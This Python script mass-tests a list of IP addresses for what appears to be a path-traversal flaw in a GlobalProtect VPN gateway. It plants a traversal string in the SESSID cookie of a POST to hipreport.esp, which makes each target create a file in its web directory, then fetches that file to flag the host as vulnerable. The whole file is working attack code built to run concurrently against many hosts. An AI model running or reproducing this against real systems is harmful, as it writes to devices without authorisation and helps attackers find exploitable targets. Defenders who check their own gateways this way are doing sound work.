import asyncio
import aiohttp
import argparse

async def send_requests(ip_address, session):
    post_url = f"https://{ip_address}/ssl-vpn/hipreport.esp"
    get_url = f"https://{ip_address}/global-protect/portal/images/sxy.txt"

    post_headers = {
        "Host": ip_address,
        "Cookie": "SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/sxy.txt;",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    post_data = ""

    get_headers = {
        "Host": ip_address,
        "Connection": "close"
    }

    # Execute the POST request
    try:
        async with session.post(post_url, headers=post_headers, data=post_data, ssl=False) as post_response:
            # Wait for the POST request to complete
            await post_response.read()

            # Execute the GET request
            async with session.get(get_url, headers=get_headers, ssl=False) as get_response:
                if get_response.status == 403:
                    print(f"[+] Vulnerable Host: {ip_address} --- {get_url}")

    except Exception as e:
        print(f"Error connecting to {ip_address}: {str(e)}")

async def process_addresses(addresses):
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [send_requests(ip, session) for ip in addresses]
        await asyncio.gather(*tasks)

def main():
    parser = argparse.ArgumentParser(description="")
    parser.add_argument('-host', metavar='IP', help="A single IP address to test")
    parser.add_argument('-list', metavar='FILE', help="A file containing a list of IP addresses to test")
    args = parser.parse_args()

    if args.host:
        asyncio.run(process_addresses([args.host]))

    elif args.list:
        try:
            with open(args.list, 'r') as file:
                ip_addresses = [line.strip() for line in file if line.strip()]
            asyncio.run(process_addresses(ip_addresses))
        except FileNotFoundError:
            print(f"No such file: {args.list}")
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
